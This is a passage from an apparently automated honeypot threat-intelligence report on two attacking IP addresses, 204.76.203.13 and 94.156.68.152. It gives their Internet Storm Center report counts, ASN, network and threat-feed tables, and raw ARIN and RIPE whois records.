  - **First Seen:** ISC first observed the IP on 2023-10-24.
  - **Last Seen:** The most recent observation was on 2023-12-03.
  - **Threat Feeds:** The IP appears on threat feeds such as blocklistde22 and ciarmy, with the corresponding firstseen and lastseen provided by these feeds.

In summary, ISC data indicates that the IP `204.76.203.13` is known for malicious activity involving at least one honeypot. The threat feeds associated with this IP underscore its involvement in malicious or anomalous behavior consistent with an attack or scanning activity.

* `2` of the `2` unique source IPs have reports on the Internet Storm Center (ISC).
* `480` total attacks were reported.
* `35` unique targets were attacked.
* The IP address with the **most reports** was `94.156.68.152` with `478` reports.
* The IP address with the **most targets** was `94.156.68.152` with `34` targets.
* The **first report** was on `2023-10-24` from `204.76.203.13`.
* The **most recent** was on `2023-12-03` from `204.76.203.13`.


| IP Address | Total Reports | Targets | First Report | Last Report | Update Time |
| --- | --- | --- | --- | --- | --- |
| 94.156.68.152 | 478 | 34 | 2023-11-30 | 2023-12-03 | 2023-12-04 04:06:55 |
| 204.76.203.13 | 2 | 1 | 2023-10-24 | 2023-12-03 | 2023-12-04 04:06:55 |

<details>
<summary>
<h4>Top 2 As</h4>
</summary>

Total ass: `2`
Unique: `2`

| as | Times Seen |
| --- | --- |
| `400328` | `1` |
| `394711` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Asnames</h4>
</summary>

Total asnames: `2`
Unique: `2`

| asname | Times Seen |
| --- | --- |
| `INTELLIGENCE-ATOM-HOSTING` | `1` |
| `LIMENET` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Ascountrys</h4>
</summary>

Total ascountrys: `2`
Unique: `2`

| ascountry | Times Seen |
| --- | --- |
| `KN` | `1` |
| `US` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Assizes</h4>
</summary>

Total assizes: `2`
Unique: `2`

| assize | Times Seen |
| --- | --- |
| `768` | `1` |
| `12800` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Networks</h4>
</summary>

Total networks: `2`
Unique: `2`

| network | Times Seen |
| --- | --- |
| `204.76.203.0/24` | `1` |
| `94.156.68.0/24` | `1` |

</details>

---


<details>
<summary>
<h4>Top 3 Threatfeeds</h4>
</summary>

Total threatfeedss: `3`
Unique: `3`

| threatfeeds | Times Seen |
| --- | --- |
| `blocklistde22` | `1` |
| `ciarmy` | `1` |
| `threatview` | `1` |

</details>

---


</details>

---


<details>
<summary>
<h2>Whois</h2>
</summary>


### Whois Results Summary

<details>
<summary>
<h3>Whois data for: 204.76.203.13</h3>
</summary>


### Whois data for: 204.76.203.13 [https://www.whois.com/whois/204.76.203.13](https://www.whois.com/whois/204.76.203.13)

```
#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
#


NetRange:       204.76.203.0 - 204.76.203.255
CIDR:           204.76.203.0/24
NetName:        ATOMDATA-HOSTINGS
NetHandle:      NET-204-76-203-0-1
Parent:         NET204 (NET-204-0-0-0-0)
NetType:        Direct Allocation
OriginAS:       AS400328
Organization:   Intelligence Hosting LLC (IHL-76)
RegDate:        2022-05-13
Updated:        2023-11-10
Comment:        AS400328
Comment:        https://privacyatintel.org
Comment:        
Comment:        Privacy is the way to succeed.
Ref:            https://rdap.arin.net/registry/ip/204.76.203.0


OrgName:        Intelligence Hosting LLC
OrgId:          IHL-76
Address:        P.O. Box 590
City:           Charlestown
StateProv:      KN
PostalCode:     0802
Country:        KN
RegDate:        2021-12-14
Updated:        2022-10-02
Comment:        Intelligence Hosting - Established 2019
Ref:            https://rdap.arin.net/registry/entity/IHL-76


OrgTechHandle: TECH1363-ARIN
OrgTechName:   Tech
OrgTechPhone:  +1-330-237-2528 
OrgTechEmail:  @proton.me
OrgTechRef:    https://rdap.arin.net/registry/entity/TECH1363-ARIN

OrgAbuseHandle: ABUSE8542-ARIN
OrgAbuseName:   Abuse
OrgAbusePhone:  +1-330-237-2528 
OrgAbuseEmail:  @privacyatintel.org
OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE8542-ARIN


#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
#
```

</details>

---


<details>
<summary>
<h3>Whois data for: 94.156.68.152</h3>
</summary>


### Whois data for: 94.156.68.152 [https://www.whois.com/whois/94.156.68.152](https://www.whois.com/whois/94.156.68.152)

```
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '94.156.68.0 - 94.156.68.255'

% Abuse contact for '94.156.68.0 - 94.156.68.255' is '@limenet.io'

inetnum:        94.156.68.0 - 94.156.68.255
netname:        LIME_NET-NET
country:        NL
mnt-domains:    lime-net-mnt
mnt-routes:     lime-net-mnt
org:            ORG-LA1853-RIPE
admin-c:        IT3219-RIPE
tech-c:         IT3219-RIPE
status:         ASSIGNED PA
mnt-by:         MNT-NETERRA
created:        2023-09-25T06:49:43Z
last-modified:  2023-11-09T09:09:47Z
source:         RIPE

organisation:   ORG-LA1853-RIPE
org-name:       Limenet
org-type:       OTHER
address:        84 W Broadway, Ste 200
address:        03038 Derry
address:        United States of America
abuse-c:        ACRO53914-RIPE
mnt-ref:        limenet-mnt
mnt-ref:        MNT-NETERRA
mnt-by:         limenet-mnt
mnt-by:         MNT-NETERRA
created:        2023-08-30T07:21:20Z
last-modified:  2023-09-25T06:42:09Z
source:         RIPE # Filtered

person:         IT Technical
address:        84 W Broadway, Ste 200
address:        03038 Derry
address:        United States of America
phone:          +1-505-297-1370
nic-hdl:        IT3219-RIPE
mnt-by:         limenet-mnt
created:        2023-08-30T07:18:31Z
last-modified:  2023-08-30T07:26:07Z
source:         RIPE

% Information related to '94.156.68.0/24AS394711'

route:          94.156.68.0/24
origin:         AS394711
mnt-by:         lime-net-mnt
created:        2023-10-23T14:01:55Z
last-modified:  2023-10-23T14:01:55Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.108 (BUSA)
```

</details>

---


</details>

---

